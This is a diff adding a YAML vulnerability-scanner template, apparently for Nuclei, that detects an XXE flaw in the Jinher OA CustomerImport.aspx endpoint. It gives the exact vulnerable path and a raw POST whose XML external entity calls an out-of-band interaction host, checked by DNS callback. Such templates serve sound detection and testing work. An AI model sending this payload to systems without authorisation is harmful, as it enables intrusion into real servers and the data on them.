@@ -1,0 +1,38 @@
+id: poc-yaml-jinher-customerimport-aspx-xxe
+info:
+  name: 金和OA CustomerImport.aspx XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe, dnslog
+  description: |
+    This template detects XXE vulnerabilities in 金和OA CustomerImport.aspx by sending a malicious XML payload and verifying DNS-based interaction.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.ContractManagement/Importing/CustomerImport.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{reverse}}/xxe_test">
+        %remote;]>
+        <root/>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "SessionId="
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
